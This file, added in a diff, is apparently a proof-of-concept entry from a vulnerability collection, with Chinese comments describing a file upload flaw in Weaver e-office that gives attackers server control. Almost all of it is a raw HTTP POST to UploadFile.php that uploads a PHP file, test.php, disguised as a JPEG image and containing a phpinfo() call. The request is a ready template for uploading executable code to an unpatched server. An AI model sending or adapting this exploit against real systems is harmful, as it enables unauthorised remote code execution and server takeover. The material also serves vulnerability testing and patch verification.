@@ -1,0 +1,17 @@
+# 泛微e-office文件上传漏洞
+# 泛微e-office存在文件上传漏洞，攻击者可利用该漏洞获取服务器控制权。
+POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=&acid=80025429&bid=hd_tag_m8mv25zc HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25zc
+RM-PRO-Token: 33c355ef299d94b0413c717d7a8f3930
+RM-PRO-Time: 1742808516268
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+
+--e64bdf16c554bbc109cecef6451c26a4
+Content-Disposition: form-data; name="Filedata"; filename="test.php"
+Content-Type: image/jpeg
+
+<?php phpinfo();?>
+
+--e64bdf16c554bbc109cecef6451c26a4--
